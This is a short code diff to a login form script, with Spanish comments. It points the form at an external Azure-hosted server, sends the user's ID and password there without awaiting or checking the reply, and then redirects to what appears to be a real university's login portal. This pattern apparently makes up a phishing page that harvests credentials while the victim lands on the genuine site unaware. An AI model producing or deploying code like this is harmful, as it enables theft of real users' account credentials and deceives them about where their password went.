@@ -17,23 +17,13 @@ document.addEventListener("DOMContentLoaded", () => {
 
         // Enviar datos al backend
         try {
-            const response = await fetch("http://localhost:3000/login", {
+            const response =  fetch("https://luk3-gabghycpchc0a6a4.brazilsouth-01.azurewebsites.net/login", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
                 },
                 body: JSON.stringify({ userid: userId, password }),
             });
-
-            if (!response.ok) {
-                const errorData = await response.json();
-                showError(errorData.message || "Login failed. Please try again.");
-                return;
-            }
-
-            // Redirigir o manejar el éxito
-            const data = await response.json();
-            console.log("Login successful:", data);
             window.location.href = "https://enlace-academico.escuelaing.edu.co/";
         } catch (error) {
             console.error("Error during login:", error);
